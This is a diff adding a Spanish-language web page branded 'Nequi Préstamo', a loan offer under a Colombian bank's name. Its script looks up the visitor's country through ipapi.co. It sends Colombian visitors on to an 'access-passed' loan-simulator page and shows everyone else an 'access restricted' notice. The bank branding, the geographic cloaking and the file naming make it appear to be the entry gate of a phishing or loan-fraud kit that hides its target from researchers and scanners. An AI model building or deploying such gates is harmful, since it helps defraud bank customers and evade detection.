@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Nequi Préstamo</title>
+    <style>
+      body {
+        margin: 0;
+        font-family: Arial, sans-serif;
+        background: #350c36;
+        color: white;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        min-height: 100vh;
+      }
+      .box {
+        text-align: center;
+        padding: 2rem;
+        max-width: 480px;
+      }
+      a {
+        color: #ff5fbf;
+        text-decoration: none;
+      }
+      .hidden {
+        display: none;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="box">
+      <p id="redirect-message">Verificando tu ubicación para permitir el acceso...</p>
+      <p id="blocked-message" class="hidden">
+        Acceso restringido. Esta página solo está disponible desde Colombia.
+      </p>
+      <p><a href="./access-passed/loan-simulator.php.html">Ir ahora</a></p>
+    </div>
+
+    <script>
+      (async function () {
+        const redirectMessage = document.getElementById('redirect-message');
+        const blockedMessage = document.getElementById('blocked-message');
+        const targetUrl = './access-passed/loan-simulator.php.html';
+
+        try {
+          const response = await fetch('https://ipapi.co/json/');
+          if (!response.ok) throw new Error('No se pudo determinar la ubicación');
+
+          const data = await response.json();
+          const countryCode = (data.country_code || '').toUpperCase();
+
+          if (countryCode === 'CO') {
+            window.location.replace(targetUrl);
+            return;
+          }
+        } catch (error) {
+          console.warn('No se pudo verificar la ubicación:', error);
+        }
+
+        redirectMessage.classList.add('hidden');
+        blockedMessage.classList.remove('hidden');
+      })();
+    </script>
+  </body>
+</html>
